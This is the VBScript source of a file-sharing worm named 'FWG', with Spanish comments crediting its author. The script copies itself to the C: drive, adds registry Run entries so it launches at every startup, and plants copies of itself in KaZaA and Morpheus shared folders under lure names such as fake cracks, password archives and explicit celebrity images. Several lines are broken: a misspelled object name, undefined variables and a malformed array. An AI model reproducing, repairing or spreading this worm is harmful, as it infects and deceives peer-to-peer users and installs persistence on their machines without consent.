   ' El worm fue creado por Yo Lo Genere!!!
   ' El worm se llama: FWG
   On Error Resume Next
   set fso = createobject("scripting.filesystemobject")
   Set s = CreateObject("Scripting.FileSystemObject")
   Set v = CreateObject("Wscript.Shell")
   set ws = createobject("scriting.filesystemobject")
   s.copyfile wscript.scriptfullname, "c:\.vbs"
   s.copyfile wscript.scriptfullname, "c:\je.vbs"
   set ws = createobject("wscript.shell")
   ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "c:\.vbs"


   ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Loader", "c:\virii.vbs"






   files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
   DirKaz = Dir1 & "\KaZaA\My Shared Folder\"
   If fso.FolderExists(DirKaz) = True Then
   For cop = 0 To 9
   fso.CopyFile file1, DirKaz & files(cop) & ".vbs"
   Next
   end if

   files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
   Dirmorph = Dir1 & "\Morpheus\My Shared Folder\"
   If fso.FolderExists(Dirmorph) = True Then
   For cop = 0 To 9
   fso.CopyFile file1, Dirmorph & files(cop) & ".vbs"
   Next
   end if
